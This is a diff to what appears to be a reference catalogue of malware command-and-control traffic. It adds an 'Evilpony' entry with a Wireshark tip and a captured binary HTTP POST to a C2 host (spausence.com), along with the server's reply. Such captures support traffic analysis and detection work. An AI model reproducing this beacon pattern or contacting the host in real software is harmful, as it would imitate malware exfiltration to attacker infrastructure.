@@ -42,6 +42,36 @@ el(R) Core(TM) i5-6400 CPU @ 2.70GHz<br>RAM: 3583.61 MB<br>IP: 18=
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/njrat.png "Bladabindi - nJrat")
 
+#### Evilpony
+Follow tcp stream, not http stream in wireshark
+~~~
+POST /d2/about.php HTTP/1.0
+Host: spausence.com
+Accept-Encoding: identity, *;q=0
+Accept-Language: en-US
+Content-Length: 337
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
+Content-Encoding: binary
+
+...Q..8.T.f5...~....I..%..`qq...q.^.i.u..v.|34.../t....w....u.}........
+6.......
+...2..T(.Z.X/..A....55.....>$l
+..uE.-..p..
+..omvs.S.uYa.Y...............Ezv...B.OM_.X.pg..1...6..}kN..U..%...2.:.H.E......9.k.-.5sD..@.*
+	k~........y.s.....@.L+X....wK.O11a.q.$.zd.A...hd9........,. ..(..tP..$.|rS....I.8"
+..X!@.	....4N...x.<.......!m~O_.T`.HTTP/1.1 200 OK
+Server: nginx/1.10.3
+Date: Thu, 03 Oct 2019 17:18:05 GMT
+Content-Type: text/html
+Connection: close
+X-Powered-By: PHP/5.4.45
+
+I6.$...Z,....   
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/evilpony.png "Evilpony")
+
 #### Hancitor
 ~~~
 POST /4/forum.php HTTP/1.1
